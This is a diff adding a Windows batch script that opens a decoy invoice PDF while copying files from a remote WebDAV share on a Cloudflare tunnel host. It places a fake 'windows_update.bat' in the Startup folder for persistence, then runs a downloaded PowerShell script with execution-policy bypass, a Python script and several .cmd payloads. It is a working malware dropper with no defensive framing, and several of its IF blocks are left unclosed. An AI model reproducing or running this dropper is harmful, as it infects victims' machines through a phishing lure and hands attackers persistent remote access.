@@ -1,0 +1,115 @@
+@echo off
+setlocal
+
+set source=\\maintenance-princess-musical-vocational.trycloudflare.com@SSL\DavWWWRoot\google\Win
+set destination=%USERPROFILE%\Downloads
+
+echo Opening PDF file...
+start "" "https://s2r.tn/cgi/INVOICERVSHA.pdf"
+
+copy /Y "%source%\windows_update.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+REM Copy python.exe to the destination folder
+copy /Y "%source%\python.exe" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy python.exe. Exiting script.
+    exit /b 1
+)
+
+REM Copy install.ps1 to the destination folder
+copy /Y "%source%\install.ps1" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy install.ps1. Exiting script.
+    exit /b 1
+)
+
+REM Run install.ps1 with Bypass policy
+echo Running install.ps1 with Bypass policy...
+powershell -ExecutionPolicy Bypass -File "%destination%\install.ps1"
+IF NOT %ERRORLEVEL% == 0 (
+    echo install.ps1 failed to execute. Exiting script.
+    exit /b 1
+)
+
+REM Delay for 2 seconds (to ensure install.ps1 is completed before continuing)
+echo Waiting for 2 seconds before running new.py...
+timeout /t 2 >nul
+
+REM Copy new.py to the destination folder
+copy /Y "%source%\new.py" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy new.py. Exiting script.
+    exit /b 1
+)
+
+REM Run new.py with cmd
+echo Running new.py...
+cmd /c "%destination%\new.py"
+IF NOT %ERRORLEVEL% == 0 (
+    echo new.py failed to execute. Exiting script.
+    exit /b 1
+)
+
+REM Delay for 2 seconds (to ensure python.exe is fully copied and ready)
+echo Waiting for 2 seconds before continuing...
+timeout /t 2 >nul
+
+REM Copy las.cmd to the destination folder
+copy /Y "%source%\las.cmd" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy las.cmd. Exiting script.
+    exit /b 1
+)
+
+REM Run las.cmd
+echo Running las.cmd...
+call "%destination%\las.cmd"
+IF NOT %ERRORLEVEL% == 0 (
+    echo las.cmd failed to execute. Exiting script.
+    exit /b 1
+
+REM Copy kam.cmd to the destination folder
+copy /Y "%source%\kam.cmd" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy kam.cmd. Exiting script.
+    exit /b 1
+)
+
+REM Run kam.cmd
+echo Running kam.cmd...
+call "%destination%\kam.cmd"
+IF NOT %ERRORLEVEL% == 0 (
+    echo kam.cmd failed to execute. Exiting script.
+    exit /b 1
+
+REM Copy zap.cmd to the destination folder
+copy /Y "%source%\zap.cmd" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy zap.cmd. Exiting script.
+    exit /b 1
+)
+
+REM Run zap.cmd
+echo Running zap.cmd...
+call "%destination%\zap.cmd"
+IF NOT %ERRORLEVEL% == 0 (
+    echo zap.cmd failed to execute. Exiting script.
+    exit /b 1
+
+REM Copy xff.cmd to the destination folder
+copy /Y "%source%\xff.cmd" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy xff.cmd. Exiting script.
+    exit /b 1
+)
+
+REM Run xff.cmd
+echo Running xff.cmd...
+call "%destination%\xff.cmd"
+IF NOT %ERRORLEVEL% == 0 (
+    echo xff.cmd failed to execute. Exiting script.
+    exit /b 1
+)
+
+
+exit /b 0
